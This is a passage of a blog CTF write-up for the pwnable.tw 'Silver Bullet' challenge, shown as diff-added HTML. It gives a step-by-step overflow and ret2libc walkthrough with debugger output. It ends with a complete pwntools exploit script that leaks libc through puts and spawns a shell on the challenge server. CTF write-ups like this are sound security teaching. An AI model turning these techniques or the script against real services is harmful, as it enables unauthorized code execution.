+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function_called + where_do_we_want_to_return + function_parameter
+</code></pre></div></div>
+<p>So we continue our string with plt[“puts”] + main_address + got[“puts”].</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powerup</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\xff</span><span class="s">"</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"main"</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]))</span>
+</code></pre></div></div>
+
+<p>Now, we execute <code class="language-plaintext highlighter-rouge">strncat</code>, and we inspect again.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/16x 0xff8558d4
+0xff8558d4:     0x41414141      0x41414141      0x41414141      0x41414141 |
+0xff8558e4:     0x41414141      0x41414141      0x41414141      0x41414141 | &lt;- description
+0xff8558f4:     0x41414141      0x41414141      0x41414141      0x42414141 |
+0xff855904:     0xffffff01      0x41414141      0x080484a8      0x08048954
+                ----------                      ----------      
+                power                          return address
+
+pwndbg&gt; p/x *(struct bullet*) 0xff8558d4
+$5 = {
+  description = {0x41 &lt;repeats 47 times&gt;, 0x42}, 
+  power = 0xffffff01
+}
+
+</code></pre></div></div>
+
+<p>As we can see, the bullet’s power is way bigger than the werewolf’s HP. And we also overwritten the return address. Now, we call beat(), we beat the werewolf, and we reach main()’s return instruction. Instead of returning to <code class="language-plaintext highlighter-rouge">__libc_start_main</code>, it will call <code class="language-plaintext highlighter-rouge">puts(puts_got_entry)</code> and we will receive puts address in libc. We subtract the puts offset, and we get the libc’s base. After we got that, we can calculate the <code class="language-plaintext highlighter-rouge">system</code> address, and we can call <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> the same way we called <code class="language-plaintext highlighter-rouge">puts(puts_got_entry)</code>.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">create</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x2f</span><span class="p">)</span>
+    <span class="n">powerup</span><span class="p">(</span><span class="sa">b</span><span class="s">"B"</span><span class="p">)</span>
+
+    <span class="n">powerup</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\xff</span><span class="s">"</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"main"</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">))))</span>
+    
+    <span class="n">beat</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>And sure, we get a shell. :3</p>
+
+<p>Full script:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./silver_bullet"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc_32.so.6"</span><span class="p">)</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ld-2.23.so"</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">"tmux"</span><span class="p">,</span> <span class="s">"new-window"</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span><span class="p">})</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10103</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"bullet :"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Good luck !!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">powerup</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"bullet :"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enjoy it !</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">beat</span><span class="p">():</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">r</span> 
+    <span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="s">'''
+                   b *0x80488fb
+                   '''</span><span class="p">)</span>
+
+
+    <span class="n">create</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x2f</span><span class="p">)</span>
+    <span class="n">powerup</span><span class="p">(</span><span class="sa">b</span><span class="s">"B"</span><span class="p">)</span>
+
+    <span class="n">powerup</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\xff</span><span class="s">"</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"main"</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]))</span>
+
+    <span class="n">beat</span><span class="p">()</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Oh ! You win !!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
+
+    <span class="n">info</span><span class="p">(</span><span class="s">"LIBC_BASE @ {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)))</span>
+
+
+
+    <span class="n">create</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x2f</span><span class="p">)</span>
+    <span class="n">powerup</span><span class="p">(</span><span class="sa">b</span><span class="s">"B"</span><span class="p">)</span>
+
+    <span class="n">powerup</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\xff</span><span class="s">"</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"main"</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">))))</span>
+    
+    <span class="n">beat</span><span class="p">()</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = '/2021/02/25/pwnable.tw-silver_bullet.html';
+     this.page.identifier = '/2021/02/25/pwnable.tw-silver_bullet';
+     this.page.title = 'Pwnable.tw Silver Bullet';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-discuss-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/nullbyte/" class="set-5">nullbyte</a> <a href="/tag/pwnable.tw/" class="set-5">pwnable.tw</a> <a href="/tag/writeup/" class="set-5">writeup</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
